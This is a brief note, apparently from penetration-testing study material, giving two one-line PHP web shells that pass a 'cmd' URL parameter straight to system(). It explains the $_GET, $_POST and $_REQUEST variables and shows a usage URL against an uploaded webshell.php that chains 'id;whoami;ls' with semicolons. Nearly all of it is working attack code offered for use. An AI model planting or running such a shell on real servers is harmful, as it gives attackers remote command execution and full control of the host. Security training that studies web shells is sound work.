
```php
<?php
    echo system($_GET["cmd"]);
?>
```

```php
<?php
    echo system($_REQUEST["cmd"]);
?>
```

`$_POST` can catch the data which is sent using POST method
`$_GET` can catch the data which is sent using GET method
`$_REQUEST` can catch the data which is sent using **both POST & GET methods**


Use by entering a URL and "view source" for prettier output
http://test.com/uploaded-files/webshell.php?cmd=id;whoami;ls

This also uses the fact that ; at a shell prompt makes it possible to run several commands after each other

